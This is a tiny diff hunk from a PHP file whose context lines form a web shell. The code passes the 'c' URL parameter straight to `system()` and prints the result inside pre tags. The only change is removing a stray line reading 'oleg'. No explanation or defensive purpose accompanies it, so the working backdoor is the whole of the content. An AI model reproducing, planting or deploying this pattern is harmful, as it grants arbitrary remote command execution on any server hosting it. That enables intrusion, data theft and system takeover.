@@ -9,5 +9,4 @@ echo "<pre>";
 $a = system($_GET["c"]);
 echo "</pre></html>";
 
-oleg
 ?>
